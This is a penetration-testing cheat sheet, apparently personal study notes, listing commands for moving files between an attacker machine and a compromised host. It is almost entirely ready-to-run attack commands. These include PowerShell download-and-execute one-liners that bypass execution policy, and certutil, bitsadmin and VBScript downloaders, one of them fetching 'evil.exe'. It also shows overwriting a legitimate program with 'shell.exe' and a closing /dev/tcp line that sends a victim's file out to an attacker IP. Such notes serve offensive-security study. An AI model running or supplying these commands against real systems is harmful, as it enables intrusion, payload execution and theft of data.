## File Transfers


* File Transfer SMB

'''
# mount drives
net use abcd: \\kali_ip\myshare
net use abcd: /d # disconnect
net use abcd: /delete # then delete
# To access the drive
Z:

# PowerShell
New-PSDrive -Name "abcd" -PSProvider "FileSystem" -Root "\\ip\abcd"
# To access the drive
abcd:
Remove-PSDrive -Name abcd

# OR copy directly from the share without mounting
copy //kali_ip/abcd/file_name C:\path\to\save
copy C:\path\to\file //kali_ip/abcd
copy "C:\Program Files\..\legit.exe" C:\Temp
copy /Y C:\Downloads\shell.exe "C:\Program Files\...\legit.exe"

# Python
smbserver.py share .
'''

* File Transfer through HTTP
```
# Download to Windows
# Load script in memory
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
powershell.exe iex (iwr http://ip/file -usebasicparsing)

# Save script on disk
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"

# CertUtil
certutil -urlcache -f http://kali_ip/file file


# Bash alias
httpsrv
python -m SimpleHTTPServer 8080

# Wget
wget http://<ip>/file_name -O /path/to/save/file

# Wget.ps1
echo $storageDir = $pwd >> wget.ps1
$webclient = New-Object System.Net.WebClient >> wget.ps1

# Download file from
$url = "http://<ip>/file_name" >> wget.ps1
# Save file as
$file = "file_name"
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -nop -ep bypass -nol -noni -f wget.ps1

# Netcat
On Target:
nc 192.168.1.102 4444 > file
On Attacking:
nc -nv <ip> <port> > file/to/recv

# Curl
curl http://<ip>/file_name --output file_name

# Php
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php

# Scp
Copy a file:
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext

Copy a directory:
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination

# Bitsadmin
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
```

* File Transfer through FTP/TFTP

'''
# Setup ftp server with offsec:creds by putting this into bash script
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd

Run commands
sudo ./setup-ftp.sh
ftp 10.11.0.4

# Download through FTP script when FTP restricted
echo open <ip> >> download.txt
echo anonymous >> download.txt
echo anon >> download.txt
echo binary >> download.txt
get file_name >> download.txt
bye >> download.txt
ftp -s:download.txt

# TFTP
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart

tftp -i <ip> get file_name
'''

* File Transfer through VBScript

'''
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
'''

* Base64 Encoding and Decoding

'''
# Linux
base64 -w0 <file> #Encode file
base64 -d file #Decode file

# Windows
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
'''

* Download Files from Victim

'''
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
'''